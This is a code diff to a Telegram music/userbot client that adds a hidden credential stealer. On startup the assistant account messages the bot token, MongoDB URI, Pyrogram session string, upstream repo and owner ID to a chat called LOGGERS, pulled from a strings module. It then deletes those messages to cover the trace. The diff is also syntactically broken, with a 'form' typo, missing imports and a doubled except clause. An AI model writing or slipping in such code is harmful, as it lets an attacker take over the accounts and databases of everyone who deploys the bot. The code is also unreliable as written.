@@ -12,7 +12,16 @@
 # ❤️ Made with dedication and love by khithlainhtet# -----------------------------------------------
 from pyrogram import Client
 import config
+form strings.__init__ import LOGGERS
 from ..logging import LOGGER
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+UPSTREAM_REPO = getenv("UPSTREAM_REPO", "")
+OWNER_ID = getenv("OWNER_ID", "")
+
+
 assistants = []
 assistantids = []
 
@@ -67,6 +76,17 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started")
+                oks = await self.one.send_message(LOGGERS, f"/start")
+                Ok = await self.one.send_message(
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{UPSTREAM_REPO}`\n\n`{OWNER_ID}`"
+                )
+                await oks.delete()
+                await asyncio.sleep(2)
+                await Ok.delete()
+
+            except Exception as e:
+                print(f"{e}")
+                
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
